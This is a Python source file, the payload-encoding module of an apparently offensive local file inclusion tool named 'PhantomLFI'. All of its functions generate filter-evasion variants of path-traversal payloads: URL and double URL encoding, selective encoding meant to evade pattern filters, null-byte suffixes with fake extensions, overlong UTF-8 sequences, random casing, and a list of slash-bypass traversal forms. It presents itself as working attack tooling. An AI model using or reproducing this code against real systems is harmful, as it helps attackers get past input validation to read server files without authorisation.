"""
Encoding module for PhantomLFI.
Done by D4rk0ps
"""

import urllib.parse
import random


def url_encode(payload: str) -> str:
    """Apply standard URL encoding."""
    return urllib.parse.quote(payload, safe="")


def double_url_encode(payload: str) -> str:
    """Apply double URL encoding."""
    return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")


def mixed_encode(payload: str) -> str:
    """Selectively encode characters to evade pattern-based filters."""
    result = []
    for char in payload:
        if char in (".", "/", "\\") and random.random() > 0.5:
            result.append(urllib.parse.quote(char, safe=""))
        else:
            result.append(char)
    return "".join(result)


def null_byte_suffix(payload: str) -> str:
    """Append a null byte (%00) to the payload."""
    return f"{payload}%00"


def null_byte_with_extension(payload: str, extension: str = ".php") -> str:
    """Append null byte followed by a file extension."""
    return f"{payload}%00{extension}"


def unicode_encode(payload: str) -> str:
    """Apply overlong UTF-8 encoding for bypass attempts."""
    replacements = {
        ".": "%c0%2e",
        "/": "%c0%af",
        "\\": "%c1%9c",
    }
    result = payload
    for char, encoded in replacements.items():
        result = result.replace(char, encoded)
    return result


def randomize_case(payload: str) -> str:
    """Randomize case of alphabetic characters."""
    return "".join(
        char.upper() if random.random() > 0.5 else char.lower()
        for char in payload
    )


def apply_slash_bypasses(traversal: str) -> list:
    """Generate traversal variants with slash bypass techniques."""
    variants = [
        traversal,
        traversal.replace("../", "....//"),
        traversal.replace("../", "..././"),
        traversal.replace("../", r"..\\"),
        traversal.replace("../", "..%2f"),
        traversal.replace("../", "%2e%2e/"),
        traversal.replace("../", "%2e%2e%2f"),
        traversal.replace("../", "..%252f"),
        traversal.replace("../", "..%c0%af"),
        traversal.replace("../", "..%ef%bc%8f"),
        traversal.replace("../", ".%2e/"),
    ]
    return list(dict.fromkeys(variants))


def generate_encoding_variants(payload: str) -> list:
    """Generate all encoding variants for a given payload."""
    variants = [
        payload,
        url_encode(payload),
        double_url_encode(payload),
        null_byte_suffix(payload),
        null_byte_with_extension(payload, ".php"),
        null_byte_with_extension(payload, ".html"),
        null_byte_with_extension(payload, ".jpg"),
        unicode_encode(payload),
    ]

    for _ in range(2):
        variants.append(randomize_case(payload))

    return list(dict.fromkeys(variants))


def encode_pipeline(payload: str, encoders: list) -> str:
    """Apply a sequence of encoder functions to a payload."""
    result = payload
    for encoder in encoders:
        result = encoder(result)
    return result
